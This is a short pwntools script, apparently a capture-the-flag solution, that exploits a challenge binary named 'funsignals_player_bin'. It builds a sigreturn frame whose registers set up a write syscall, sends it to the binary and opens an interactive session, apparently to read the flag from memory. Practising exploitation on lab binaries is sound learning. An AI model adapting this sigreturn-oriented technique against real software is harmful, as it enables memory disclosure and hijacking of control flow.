#!/usr/bin/python3
from pwn import *

exe = "./funsignals_player_bin"

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
# building fake frame
# automated
context.arch = "amd64"
framez = SigreturnFrame()
framez.rdi = 0x1
framez.rsi = 0x10000028
framez.rax = 0x01
framez.rdx = 0x200
framez.rip = 0x10000015
p.send(bytes(framez))
p.interactive()
# print(framez)